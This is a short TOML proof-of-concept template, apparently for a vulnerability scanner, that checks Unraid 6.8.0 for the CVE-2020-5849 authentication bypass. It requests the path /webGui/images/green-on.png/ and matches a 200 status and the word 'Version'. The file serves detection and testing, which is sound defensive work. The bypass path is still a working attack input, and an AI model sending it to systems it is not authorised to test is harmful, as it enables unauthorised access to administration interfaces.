[info]
author = "ave"
description = "通过访问 /webGui/images/green-on.png/ 路径触发认证绕过，验证 Unraid 6.8.0 是否存在认证绕过漏洞"
id = "POC-AVE-2020-1686"
name = "Unraid 6.8.0 Authentication Bypass PoC"
severity = "high"
tags = ["ave-2020-1686"]
vuln_id = [
    "CVE-2020-5849",
    "AVE-2020-1686",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/webGui/images/green-on.png/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Version"]
